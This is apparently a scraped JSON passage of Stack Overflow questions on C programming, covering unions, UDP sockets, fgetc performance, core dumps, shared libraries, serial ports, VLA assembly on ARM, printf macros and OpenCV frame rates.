packet using union struct?","body":"<p>I need to create binary data packets in C code. However, I am missing some fundamental point. Currently, there are already structs defined and I will need to use them (at least for reading packet data). The same structure will be used both for received packets and for sent packets. Here are packet structs:   </p>\n\n<pre><code>typedef struct {\n\n  uint8_t packetType;\n  uint16_t packetBody;\n\n} MyStruct;\n</code></pre>\n\n<p>and another struct:</p>\n\n<pre><code>typedef union {\n\n  const uint8_t *bytes; \n  MyStruct *packet;\n\n} MyPacket;\n</code></pre>\n\n<p>Here's the function that should take a pointer to the struct, fill it with data and return back:</p>\n\n<pre><code>void packetWithBytes(MyPacket *packet)\n{\n  packet-&gt;packet-&gt;packetType = 1; // crashed with EXC_BAD_ACCESS\n  packet-&gt;packet-&gt;packetBody = 3;\n}\n</code></pre>\n\n<p>Here's a call to my function that should return a pointer to binary data:</p>\n\n<pre><code>MyPacket *packetRef;\npacketWithBytes(packetRef); \n\nNSData *data = [NSData dataWithBytes:packetRef-&gt;bytes length:sizeof(packetRef-&gt;bytes)];\n</code></pre>\n\n<p>I feel I should allocate some space somewhere (with <code>malloc</code>) but not sure where and how to do that. The calling part code should not know any details about the size of the packet. Tried to do allocation but getting the same error:</p>\n\n<pre><code>void packetWithBytes(MyPacket *packet)\n{\n  packet-&gt;bytes = malloc(sizeof(uint8_t) + sizeof(uint16_t)); //crash\n  packet-&gt;packet-&gt;packetType = 1;\n  packet-&gt;packet-&gt;packetBody = 3;\n}\n</code></pre>\n\n<p>Tried to remove <code>const</code> from <code>MyStruct</code> member bytes but getting the same error. I'm not not very familiar with C, so help would be very appreciated. </p>\n"},{"tags":["c","udp"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3075,"score":3,"question_id":702451,"title":"How do I get sender's UDP port in C?","body":"<p>I have the following typical code in C under Linux to get UDP data:</p>\n\n<pre><code>sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);\nmysock.sin_family = AF_INET;\nmysock.sin_addr.s_addr = INADDR_ANY;\nmysock.sin_port = my_port;\nbind(sock, &amp;mysock, sizeof(mysock);\nrecvfrom(sock, buf, PKTSZ, 0, &amp;client, len);\n</code></pre>\n\n<p>All the above code works, but now I have a need to find out the sender's udp port, is there a structure or system call I can use to retrieve such info when I receive a udp packet ?</p>\n\n<p>thanks</p>\n"},{"tags":["c","arrays","sorting","occurences"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13237588,"title":"find the number of occurrence of each element in an array and update the information related to each elements","body":"<p>I have a big 2-D array, <code>array[length][2]</code>. the length= 500000.\nIn array[i][0]= hex number,  array[i][1]= 0 or 1, which represents some information related to each hex number. Like this:</p>\n\n<pre><code>array[i][0]    array[i][1]\n\ne05f56f8           1\n\ne045ac44           1\n\ne05f57fc           1\n\ne05f57b4           1\n\ne05ff8dc           0\n\ne05ff8ec           0\n\ne05ff900           1\n</code></pre>\n\n<p>I want to get a new array which stores: the hex number,# of occurance, the sum of array[i][1] of the same hex number.</p>\n\n<p>I write the code like this:\n//First Sort the array according to array[][0]</p>\n\n<pre><code>int x,y,temp1,temp2;\n  for (x=lines_num1-2;x&gt;=0;x--)\n    {\n      for (y=0;y&lt;=x;y++)\n       {\n        if(array[y][0]&gt;array[y+1][0])\n         {\n            temp1=array[y][0];\n            array[y][0]=array[y+1][0];\n            array[y+1][0]=temp1;\n\n            temp2=array[y][1];\n            array[y][1]=array[y+1][1];\n            array[y+1][1]=temp2;                \n          }\n       }\n   }\n\n// generate the new_array[][]\nint new_array[length][3];\nint n=0;\nfor (n=0; n&lt;length; n++){\n   new_array[n][0]=0;\n   new_array[n][1]=0;\n   new_array[n][2]=0;\n}\nint prev = array[0][0];\nnew_array[0][0]=array[0][0];\nnew_array[0][1]=1;\nnew_array[0][2]=array[0][2];\nfor (k=1;k&lt;length;k++)\n  {\n     if (array[k][0] == prev)\n       {\n         new_array[n][1]=new_array[n][1]+1;\n         new_array[n][2]=new_array[n][2]+array[k][0];\n       }else{\n         prev = array[k][0];\n         new_array[n+1][0]=array[k][0];\n         new_array[n+1][1]=new_array[n+1][1]+1;\n         new_array[n+1][2]=new_array[n+1][2]+array[k][0];\n         n++;\n       }\n   } \n</code></pre>\n\n<p>But the code seems not work as I expected.\nFirst the sorting is so slow.\nAnd It seems cannot generate the correct new_array.\nAny suggestion of how to deal with this.\nThanks.</p>\n"},{"tags":["java","c++","c","rotation","using"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":3,"view_count":78,"score":-1,"question_id":13237797,"title":"How to rotate a motor using Java/.net/c without using a micro controller","body":"<p>How to rotate  a motor using Java/.net/c without using a micro controller?\nI know the programming in Java/.net/c/c++ but I have no idea about the ports and rotating motor using the port communication.</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13225014,"title":"Why fgetc too slow?","body":"<p>I've written a program that reads an whole file via <code>fgetc</code>:</p>\n\n<pre><code>while ((c = fgetc(f)) != EOF) { ... }\n</code></pre>\n\n<p>But the program is too slow. When I changed <code>fgetc</code> to <code>fread</code>,</p>\n\n<pre><code>static unsigned char buf[4096];\n\nwhile ((n = fread(buf, 1, sizeof(buf), f)) &gt; 0) { ... }\n</code></pre>\n\n<p>the program works about <strong>10 times</strong> faster.</p>\n\n<p>Why? As I know, <code>fgetc</code> is a buffered function, so it should work as fast as the second version with explicit buffer, isn't it?</p>\n"},{"tags":["c","bitwise","clang"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":56,"score":-1,"question_id":13237373,"title":"bitwise right shift large number","body":"<p>Why do I not get the correct answer if I do like this:</p>\n\n<pre><code>long long number = 5500000000000000; // 16 digit number - 53bit\nlong long temp_number = 0;\n\ntemp_number = number &gt;&gt; 50;\n\nprintf(\"%d\", temp_number);\n</code></pre>\n\n<p>Answer will be: 4</p>\n\n<p>That is not correct, I want it to show 5.</p>\n\n<p>Kind regards</p>\n"},{"tags":["c","solaris"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13236913,"title":"generate core from C program on Solaris","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/131439/how-can-a-c-program-produce-a-core-dump-of-itself-without-terminating\">How can a C program produce a core dump of itself without terminating?</a>  </p>\n</blockquote>\n\n\n\n<p>I would like to generate a core from a C program without terminating the running process.\nOS is Solaris.</p>\n\n<p>I know that gcore can be used for this purpose. But I have no idea how to use 'gcore' from a C program.</p>\n"},{"tags":["c","linux","serial-port","tty"],"answer_count":7,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":1561,"score":4,"question_id":3228681,"title":"C write() doesn't send data until close(fd) is called","body":"<p>So I have this test code to send \"HELLO\" over a USB serial port:</p>\n\n<pre><code>int fd;\nstruct termios tty;\n\nif((fd = open(\"/dev/ttyUSB0\", O_WRONLY|O_NONBLOCK|O_NOCTTY)) == -1){\nerr(1, \"Cannot open write on /dev/ttyUSB0\");\n}\n\ntcgetattr(fd, &amp;tty);\ntty.c_iflag = 0;\ntty.c_oflag = 0;\ntty.c_lflag = 0;\ntty.c_cflag = 0;\ntty.c_cc[VMIN] = 0;\ntty.c_cc[VTIME] = 0;\ncfsetospeed(&amp;tty, B19200);\ncfsetispeed(&amp;tty, B19200);\ntty.c_cflag |= CREAD|CRTSCTS|HUPCL|CS8;\ntcsetattr(fd, TCSANOW, &amp;tty);\n\nprintf(\"Write: %i\\n\", write(fd, \"HELLO\", 5));\n\nsleep(5);\n\nif(close(fd) != 0){\nwarn(\"Could not close write fd\");\n}\n</code></pre>\n\n<p>The program executes fine and \"HELLO\" is sent but there is one problem.  \"HELLO\" doesn't seem to be sent when the write() function is called, but rather when the file descriptor is closed.  I added the sleep(5) line above to test out this theory and sure enough, \"HELLO\" is sent ~5 seconds after the program is executed.  How can I get \"HELLO\" to be sent immediately after the write() command instead of on close()?</p>\n"},{"tags":["c","sockets","buffer","readdir","chunks"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13219943,"title":"Howto send data through socket: one buffer, scatter/gatter or readdir like?","body":"<p>I'm writing an FUSE overlay fs (notifyfs), which can be an database clients can get data from\nthrough queries. My intention is to make it a cache/overlayfs/database clients can get data from when showing entries and their properties (attributes but also mimetype, icon etc).</p>\n\n<p>A query is to get the contents of a directory. The client, which has already a connection (=fd) to notifyfs, asks for the data via a \"list_message\". My question is now howto programm the response notifyfs has to give. I'm thinking about three/two different methods. Note the following:</p>\n\n<p>notifyfs responses in the basic form with different entries, where every entry is sort of:</p>\n\n<pre><code>int mode\nuid_t uid\ngid_t gid\nsize_t size\ntimespec ctime\ntimespec mtime\ntimespec atime\nint lenname\nchar name[]\n</code></pre>\n\n<p>(call this notifyfs_entry_struct)</p>\n\n<p>Note that the len of the name is not fixed, and is maximum 255.\nFuther clients ask for a certain number of entries, with a maximum. I'm not sure about this maximum exactly, but it will be something like 80.</p>\n\n<p>a. one big buffer. The size is something like:</p>\n\n<p>80 x (255+sizeof(struct notifyfs_entry_struct))</p>\n\n<p>which will be more than 20400 bytes to be sure.</p>\n\n<p>b. chunks of fixed size, using something like iovec or readdir.</p>\n\n<p>What is the best option?\nThe first method uses a  buffer which will be at least 20400 bytes, it's a lot, but is it still doable?</p>\n\n<p>Stef</p>\n"},{"tags":["c++","c","linux","coredump","abort"],"answer_count":8,"favorite_count":17,"up_vote_count":25,"down_vote_count":0,"view_count":16147,"score":25,"question_id":979141,"title":"How to programatically cause a core dump in C/C++","body":"<p>I would like to force a core dump at a specific location in my C++ application.</p>\n\n<p>I know I can do it by doing something like:</p>\n\n<pre><code>int * crash = NULL;\n*crash = 1;\n</code></pre>\n\n<p>But I would like to know if there is a cleaner way?</p>\n\n<p>I am using Linux by the way.</p>\n"},{"tags":["c","linker","shared-libraries"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":13236987,"title":"creating a shared library from a static library","body":"<p>I am having trouble generating a shared object from a static library. While I know there are other alternatives, I am now bothered (as opposed to stuck) by why this isn't working and how to make it work.</p>\n\n<p>Below is very simple source code I am using.</p>\n\n<p>get_zero.c</p>\n\n<pre><code>#include \"get_zero.h\"\n\nint\nget_zero(void)\n{\n        return 0;\n}\n</code></pre>\n\n<p>get_zero.h</p>\n\n<pre><code>int get_zero(void);\n</code></pre>\n\n<p>main.c</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#include \"get_zero.h\"\n\nint\nmain(void)\n{\n    return get_zero();\n}\n</code></pre>\n\n<p>The goal is create two functionally equal applications using libget_zero_static and libget_zero_shared.</p>\n\n<p>Here are my compilation/linking steps:</p>\n\n<pre><code>gcc -c -fPIC get_zero.c\nar cr libget_zero_static.a get_zero.o\ngcc -shared -o libget_zero_shared.so -L. -Wl,--whole-archive -lget_zero_static -Wl,-no--whole-archive\n</code></pre>\n\n<p>/usr/bin/ld: cannot find -lgcc_s\n/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/4.6/../../../x86_64-linux-gnu/libc.a(init-first.o): relocation R_X86_64_32 against `_dl_starting_up' can not be used when making a shared object; recompile with -fPIC\n/usr/lib/gcc/x86_64-linux-gnu/4.6/../../../x86_64-linux-gnu/libc.a(init-first.o): could not read symbols: Bad value\ncollect2: ld returned 1 exit status</p>\n\n<p>This is on a 64-bit Ubuntu system.</p>\n\n<p>I read about the whole-archive option here, and it seemed like this questions should have removed all of my road blocks.\n<a href=\"http://stackoverflow.com/questions/6263780/how-to-create-a-shared-object-file-from-static-library\">How to create a shared object file from static library</a></p>\n"},{"tags":["c","typedef"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":85,"score":2,"question_id":13235700,"title":"typedef - does not name a type","body":"<p>i have two headers</p>\n\n<p>in header “BinTree.h\":</p>\n\n<pre><code>typedef struct node {\n    ElemType data;\n    struct node *lchild;\n    struct node *rchild;\n}BTNode;\n</code></pre>\n\n<p>in header \"Queue.h\"(which includes BinTree.h):</p>\n\n<pre><code>typedef BTNode* Dataype;\n</code></pre>\n\n<p>at compiling the compilor said:\n     error: ‘BTNode’ does not name a type</p>\n\n<p>What's wrong?</p>\n"},{"tags":["c","for-loop"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":13236280,"title":"For loop in C, with automatic increment or decrement depending on init and end conditions","body":"<p>I recall seeing a very elegant \"for\" loop construct in C, that would increment or decrement the loop variable automatically based on whether the initial value was more or less than the end condition value.</p>\n\n<p>In other words, something like this:</p>\n\n<pre><code>fadeUpDown(startVal, stopVal /*, stepSize */ ) {      \n\n    // SOME CODE THAT SETS UP WHETHER TO INCREMENT OR DECREMENT\n\n    for (int i=startVal ; i != stopVal ; ### SOME TRICKY CODE ### ) {    \n        // The actual looped code      \n    }\n}\n</code></pre>\n\n<p>Having searched quite a bit for this code again, I have had no success, so here I am, asking if someone could help me with this.</p>\n\n<p><strong>Edit:</strong> We're all integers here.<br>\nSanity check on StopVal being an integral increment / decrement of StepSize is outside the scope.<br>\nActually, let's just <strong>skip StepSize and make it 1</strong>, in fact.</p>\n"},{"tags":["c","io","protocols","arduino","meter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13236207,"title":"How can I read in M-bus metering data with an Arduino Uno?","body":"<p>I am trying to send data from a Kamstrup Multical 601 to an Arduino Uno using the <a href=\"http://en.wikipedia.org/wiki/Meter-Bus\" rel=\"nofollow\">M-bus</a> protocol.</p>\n\n<p>I am considering trying to use the <a href=\"https://github.com/rscada/libmbus\" rel=\"nofollow\">libmbus c libraries</a> to do this. However, I do not have a lot of experience in c programming so was wondering if:</p>\n\n<ul>\n<li>you think this is a realistic/achievable approach?</li>\n<li>anyone could suggest an alternative/easier approach?</li>\n</ul>\n\n<p>The main chip on the Arduino Uno is the Atmel Atmega382P-PU.</p>\n\n<p>After getting the data to the Arduino I aim to perform some calculations and send data to an LCD display (this I think I can do).</p>\n"},{"tags":["c","formatting","printf","string-replacement"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13235625,"title":"How to remove a character from output string by *printf() function family using formats?","body":"<p>How to remove a character from output string by *printf() function family using formats? it's possible? </p>\n\n<p>from macros this macros:</p>\n\n<pre><code>  char *s =\n    g_strdup_printf(\n    \"insert into foo(name,serie,\"\n#define X(a, b) #a \",\"\n    LIST \") \"\n#undef X\n#define X(a, b) \"%d,\"\n    \"values('%s',\" LIST \"%d\" \")\",\n#undef X\n#define X(a, b) bol-&gt;a,\n    boletim-&gt;aname, serie, LIST\n#undef X\n            );\n</code></pre>\n\n<p>I get output something like this:</p>\n\n<pre><code>  char *s =\n    g_strdup_printf(\n    \"insert into foo(name,serie,\"\n\n    \"red\" \",\" \"blue\" \",\" \"yellow\" \",\" \"purple\" \",\" \") \"\n\n\n    \"values('%s',\" \"%d,\" \"%d,\" \"%d,\" \"%d,\" \"%d\" \")\",\n\n\n    boletim-&gt;aname, serie, boletim-&gt;red, boletim-&gt;blue, boletim-&gt;yellow, boletim-&gt;purple,\n\n      );\n</code></pre>\n\n<p>A <code>puts(s)</code> call prints the following:</p>\n\n<pre><code>insert into foo(name,serie,red,blue,yellow,purple,) values('Ari tol',-1,-1,-1,-1,0)\n</code></pre>\n\n<p>But I have a problem, the <code>,</code> before first <code>)</code> that turns the SQL query invalid. I'm looking for some way to remove it from string. Maybe by some format that can be used in <code>printf()</code> functions family or re-define the macros. I don't know. It's just a try to don't write routines that search for index first of <code>)</code> and after another call to a string-replace function by index.</p>\n"},{"tags":["c","linux","unix","ssh","sh"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":13233041,"title":"How to manage root actions in batch script triggered by an SSH","body":"<p>Ok, here is a tricky question:</p>\n\n<p>First, I have a very small C application that runs in an Unix machine. This application gets two arguments and tries to execute an .sh file in a Linux (Ubuntu) machine, like this:</p>\n\n<p><code>./myapp luke leia</code></p>\n\n<p>Ok, now the C code executes more or less this:</p>\n\n<pre><code>char temp[512];\nsprintf(temp, \"ssh user@server \\\"sh \\\\$HOME/save.sh %s %s\\\"\", argv[1], argv[2]);\nsystem((char *)temp);\n</code></pre>\n\n<p>As you can see, it opens a connection to my Linux server and executes a batch script in the home folder of my 'user'. This is how it looks like when I try directly in my terminal:</p>\n\n<p><code>ssh user@server \"sh \\$HOME/save.sh luke leia\"</code></p>\n\n<p>In my Unix side, I am asked for a password for the SSH, and it works just fine. I get all the echoes from the save.sh file in my Unix machine and it works well, except if I need a sudo permission. So I tried this in my server:</p>\n\n<ol>\n<li><p>Using <code>sudo visudo</code> in the server, below the line that says <code>%sudo ALL=(ALL) ALL</code> I put:</p>\n\n<p><code>%user ALL=(ALL) NOPASSWD: /home/user/save.sh</code></p></li>\n<li><p>My save.sh looks like this:</p></li>\n</ol>\n\n<blockquote>\n<pre><code>#! /bin/bash\nsudo echo \"[save action] args: ${1} , ${2}\" &gt;&gt; /somewhere/save.log;\necho \"${1} and ${2} are brother and sister.\";\n</code></pre>\n</blockquote>\n\n<ol>\n<li>My folder \"somewhere\" belongs to root, so normally my 'user' can't save it. So I changed the code in my application to handle this command instead:</li>\n</ol>\n\n<p><code>ssh user@server \"sudo sh \\$HOME/save.sh luke leia\"</code></p>\n\n<p>Now I get this error:</p>\n\n<p><code>sudo: no tty present and no askpass program specified</code></p>\n\n<p>Which is the best way to trigger this script using sudo and not being prompted with root password? I tried using <code>-t</code>, but is asks for root password. Any thoughts?</p>\n"},{"tags":["c","gcc","assembly","compilation","arm"],"answer_count":1,"favorite_count":2,"up_vote_count":12,"down_vote_count":0,"view_count":168,"score":12,"question_id":13234926,"title":"Variable length arrays in C, how are they compiled","body":"<p>I have some given code that uses variable length arrays on the stack in C. I cannot easily change that code to use <code>malloc</code>ed buffers on the heap, since I am working on some stuff where I have no operating system support for dynamic memory. However when I test my method the stack actually get's smashed instead (i.e. the <code>SP</code> get's set to a completely bogus address). To figure out what is going on I had a look at the assembly and I was completely confused by the compiler output.</p>\n\n<p>I am running the code on a pandaboard ES (OMAP4460 ARM processor).</p>\n\n<p>In order to test how variable size arrays on the stack are actually compiled, I produced a simple working test program. However again the code was much too confusing for me to understand.</p>\n\n<p>Here is what I do not understand:</p>\n\n<p>When I compile a simple function:</p>\n\n<pre><code>int test_method(size_t i)\n{\n   unsigned char buffer[10];\n   return -1;\n}\n</code></pre>\n\n<p>I get some very simple assembler code:</p>\n\n<pre><code>80003a68 &lt;test_method&gt;:\n80003a68:       b480            push    {r7}        ; store frame pointer\n80003a6a:       b087            sub     sp, #28     ; make stack frame (size 28)\n80003a6c:       af00            add     r7, sp, #0  ; set frame pointer\n80003a6e:       6078            str     r0, [r7, #4]; store parameter on stack\n80003a70:       f04f 0300       mov.w   r3, #0      ; load return value\n80003a74:       4618            mov     r0, r3      ; put return value in return register\n80003a76:       f107 071c       add.w   r7, r7, #28 ; destroy stack frame\n80003a7a:       46bd            mov     sp, r7      ; ...\n80003a7c:       bc80            pop     {r7}        ; pop stored frame pointer\n80003a7e:       4770            bx      lr          ; return\n</code></pre>\n\n<p>But when I try this with a variable size array using the following code:</p>\n\n<pre><code>int test_method(size_t i)\n{\n    unsigned char buffer[i];\n    return 0;\n}\n</code></pre>\n\n<p>I get this assembly:</p>\n\n<pre><code>80003a68 &lt;test_method&gt;:\n80003a68:       e92d 03f0       stmdb   sp!, {r4, r5, r6, r7, r8, r9}\n80003a6c:       b084            sub     sp, #16\n80003a6e:       af00            add     r7, sp, #0\n80003a70:       6078            str     r0, [r7, #4]\n80003a72:       4669            mov     r1, sp\n80003a74:       460e            mov     r6, r1\n80003a76:       f8d7 c004       ldr.w   ip, [r7, #4]\n80003a7a:       4661            mov     r1, ip\n80003a7c:       f101 31ff       add.w   r1, r1, #4294967295     ; 0xffffffff\n80003a80:       60b9            str     r1, [r7, #8]\n80003a82:       4660            mov     r0, ip\n80003a84:       f04f 0100       mov.w   r1, #0\n80003a88:       f04f 38ff       mov.w   r8, #4294967295 ; 0xffffffff\n80003a8c:       f04f 090f       mov.w   r9, #15\n80003a90:       ea00 0008       and.w   r0, r0, r8\n80003a94:       ea01 0109       and.w   r1, r1, r9\n80003a98:       ea4f 7850       mov.w   r8, r0, lsr #29\n80003a9c:       ea4f 05c1       mov.w   r5, r1, lsl #3\n80003aa0:       ea48 0505       orr.w   r5, r8, r5\n80003aa4:       ea4f 04c0       mov.w   r4, r0, lsl #3\n80003aa8:       f04f 30ff       mov.w   r0, #4294967295 ; 0xffffffff\n80003aac:       f04f 010f       mov.w   r1, #15\n80003ab0:       ea04 0400       and.w   r4, r4, r0\n80003ab4:       ea05 0501       and.w   r5, r5, r1\n80003ab8:       4660            mov     r0, ip\n80003aba:       f04f 0100       mov.w   r1, #0\n80003abe:       f04f 34ff       mov.w   r4, #4294967295 ; 0xffffffff\n80003ac2:       f04f 050f       mov.w   r5, #15\n80003ac6:       ea00 0004       and.w   r0, r0, r4\n80003aca:       ea01 0105       and.w   r1, r1, r5\n80003ace:       ea4f 7450       mov.w   r4, r0, lsr #29\n80003ad2:       ea4f 03c1       mov.w   r3, r1, lsl #3\n80003ad6:       ea44 0303       orr.w   r3, r4, r3\n80003ada:       ea4f 02c0       mov.w   r2, r0, lsl #3\n80003ade:       f04f 30ff       mov.w   r0, #4294967295 ; 0xffffffff\n80003ae2:       f04f 010f       mov.w   r1, #15\n80003ae6:       ea02 0200       and.w   r2, r2, r0\n80003aea:       ea03 0301       and.w   r3, r3, r1\n80003aea:       ea03 0301       and.w   r3, r3, r1\n80003aee:       4663            mov     r3, ip\n80003af0:       f103 0307       add.w   r3, r3, #7\n80003af4:       f103 0307       add.w   r3, r3, #7\n80003af8:       ea4f 03d3       mov.w   r3, r3, lsr #3\n80003afc:       ea4f 03c3       mov.w   r3, r3, lsl #3\n80003b00:       ebad 0d03       sub.w   sp, sp, r3\n80003b04:       466b            mov     r3, sp\n80003b06:       f103 0307       add.w   r3, r3, #7\n80003b0a:       ea4f 03d3       mov.w   r3, r3, lsr #3\n80003b0e:       ea4f 03c3       mov.w   r3, r3, lsl #3\n80003b12:       60fb            str     r3, [r7, #12]\n80003b14:       f04f 0300       mov.w   r3, #0\n80003b18:       46b5            mov     sp, r6\n80003b1a:       4618            mov     r0, r3\n80003b1c:       f107 0710       add.w   r7, r7, #16\n80003b20:       46bd            mov     sp, r7\n80003b22:       e8bd 03f0       ldmia.w sp!, {r4, r5, r6, r7, r8, r9}\n80003b26:       4770            bx      lr\n</code></pre>\n\n<p>Where does all this additional logic come frome? I would have thought, that it would have been enough to just enlarge the stack frame by the size <code>i</code> (passed in <code>r0</code>), maybe with an addition of some extra code to keep the alignment. But why are all these additional registers written with <code>0xffffffff</code> and <code>#15</code>. I cannot really make any sense of this assembly the compiler is giving me.</p>\n"},{"tags":["c","arrays","char","concatenation"],"answer_count":7,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":13229111,"title":"C char array concatenation","body":"<p>What I have:</p>\n\n<pre><code>char cmd[50] = \"some text here\";\nchar v[] = {'a','s','d','c','b'};\n</code></pre>\n\n<p>So I want to concatenate cmd by adding a letter from <code>v</code>.\nObviously</p>\n\n<pre><code>strcat(cmd, v[3]);\n</code></pre>\n\n<p>does't work because strcat doesn't accept the <code>v[n]</code> parameter <code>n = int</code>.</p>\n"},{"tags":["c","memory","struct","runtime"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":60,"score":-5,"question_id":13235572,"title":"Performance differences in array handling","body":"<p>I have this code:</p>\n\n<pre><code>typedef struct\n{\nint a[4];\n} ArrStruct;\n\nvoid printSizeOfArray(ArrStruct arrStruct)\n{\nprintf(\"%lu\\n\", sizeof(arrStruct.a));\n++(arrStruct.a[2]);\n}\n\nint main()\n{\n\nint it;\nArrStruct arrStruct;\nprintSizeOfArray(arrStruct);\n\nfor (it = 0 ; it &lt; sizeof(arrStruct.a)/sizeof(int); ++it)\n{\nprintf(\"%d, \", arrStruct .a[it]);\n}\n\nreturn 0;\n}\n</code></pre>\n\n<p>Someone told that it does not have a good runtime/memory performance compared to this next code. What is the difference?</p>\n\n<pre><code>void printSizeOfArray(int a[])\n\n{\nprintf(\"%lu\\n\", sizeof(a));\n++(a[2]);\n}\n\nint main()\n{\n\nint it;\nint a[4] = {0};\nprintSizeOfArray(a);\nfor (it = 0 ; it &lt; sizeof(a)/sizeof(int) ; ++it)\n{\nprintf(\"%d, \", a[it]);\n}\nreturn 0;\n}\n</code></pre>\n\n<p>Why would the second code have better performance?</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":1162,"score":0,"question_id":5064379,"title":"Generating unique random numbers in C","body":"<p>I tried generating 10 unique random numbers in C. I have an array <code>numout[]</code> for 10 numbers but this gets to \"segmentation fault\" after some time.</p>\n\n<p>Tho code is:</p>\n\n<pre><code>int i,j,numout[10],randnum;\n\nvoid main()\n{\n    srand(time(NULL));  \n    for(i=0;i&lt;10;i++)\n    {\n        numout[i]=generate();\n        printf(\"%d\",numout[i]);\n        fflush(stdout);\n        sleep(1);\n        printf(\"\\b\");\n    }\n}\nint generate()\n{\n    randnum=1+(int)(rand()*mul_val/(RAND_MAX+1.0));\n    for(j=0;j&lt;i;j++)\n    {\n        if(randnum==0 || randnum==numout[j])\n        {\n            randnum=generate();     \n        }\n    }\n    return(randnum);\n}\n</code></pre>\n"},{"tags":["objective-c","c"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13235603,"title":"Xcode .c file send message to objective-c (.m) file","body":"<p>Lots functions of my program are in C file, and C has a head file therefore Objective-C files could use the functions in C, but some of the functions is use for fetch the information from the internet, for instance, somebody send a instant message to the user, and one of the functions in C file could get the information, but how could this function in C file send information to Objective-C file and show the message to the user.\nTherefore my question is: how to let the function in C file sending message to Objective-C.\nCheers, pls help!</p>\n"},{"tags":["c","visual-c++","image-processing","opencv","video-capture"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13229786,"title":"Very Slow Processing of my Opencv Application","body":"<p>I am building an OpenCV application which captures a video from camera and overlays it on another video after removing the background. </p>\n\n<p>I am not able to achieve a reasonable speed as it is playing the output at about 1 fps, whereas my background removal is working at 3fps.</p>\n\n<p>Is there a way to display the background video at its normal speed and overlay the processed video at 3fps ?</p>\n\n<p>I tried commenting out my code and I realized that the problem lies majorly with the Rendering part itself. I tried displaying the video along with my web cam feed and I noticed that there is a drop in the actual fps and the fps of video when displayed with openCV.</p>\n\n<p>here is the sample code:</p>\n\n<pre><code> void main()\n{\n    CvCapture* capture, *Vcap;\n    capture = cvCaptureFromCAM(0);\n    if(!capture)\n    {\n        printf(\"Video Load Error\");\n    }\n\n    Vcap = cvCaptureFromAVI(\"bgDemo.mp4\");\n    //printf(\"\\nEntered BGR\");\n    if(!Vcap)\n    {\n        printf(\"Video Load Error\");\n    }\n\n    while(1)\n    {\n\n        IplImage* src = cvQueryFrame(Vcap);\n        if(!src)\n        {\n            Vcap = cvCaptureFromAVI(\"bgDemo.mp4\");\n            continue;\n        }\n        IplImage* bck1 = cvCreateImage(cvGetSize(src),8,3);\n        cvResize(src,bck1,CV_INTER_LINEAR);\n\n        cvShowImage(\"BCK\",bck1);\n        cvWaitKey(1);\n    }\n}\n</code></pre>\n"},{"tags":["c","function","pointers"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":13228335,"title":"suggest a way to fix gas and electric charge calculation","body":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#define BASELINE 75.6\n#define CONST1 0.11430\n#define CONST2 0.12989\n#define CONST3 0.22944\n#define CONST4 0.32146\n#define GAS_BASELINE 12.6\n#define CONST5 1.13309\n#define CONST6 1.35349\n\nvoid getInput( long *preElecRead, long *currElecRead, long *preGasRead, long *currGasRead);\ndouble calcOutput( double *kwhConsumed, double *thermsConsumed, double *elecCharges, double *gasCharges, double *totalDue,\n            long preElecRead, long currElecRead, long preGasRead, long currGasRead);\nvoid printOutput(long preElecRead, long currElecRead, long preGasRead, long currGasRead,double kwhConsumed, double thermsConsumed,\n             double elecCharges, double gasCharges, double totalDue );\ndouble calcKWH(long preElecRead, long currElecRead);\ndouble calcGasTherms(long preGasRead, long currGasRead);\ndouble calcElecCharges(double* kwhConsumed);\ndouble calcGasCharges(double thermsConsumed);\ndouble round100th(double n);\ndouble calcTotalDue(double* gasCharges, double* elecCharges);\n\n\nint main(void)\n{   //Declaration\n    long preElecRead;\n    long currElecRead;\n    long preGasRead;\n    long currGasRead;\n    double kwhConsumed;\n    double thermsConsumed;\n    double elecCharges;\n    double gasCharges;\n    double totalDue;\n    //Statement\n    getInput(&amp;preElecRead, &amp;currElecRead, &amp;preGasRead, &amp;currGasRead);\n    calcOutput(&amp;kwhConsumed, &amp;thermsConsumed, &amp;elecCharges, &amp;gasCharges, &amp;totalDue, preElecRead,\n            currElecRead, preGasRead, currGasRead);\n    printOutput(preElecRead, currElecRead, preGasRead, currGasRead, kwhConsumed, thermsConsumed, elecCharges, gasCharges,totalDue);\n\n    return 0;\n}   //end main\n\nvoid getInput( long *preElecRead, long *currElecRead, long *preGasRead, long *currGasRead)\n{\n    printf(\"Enter previous &amp; current 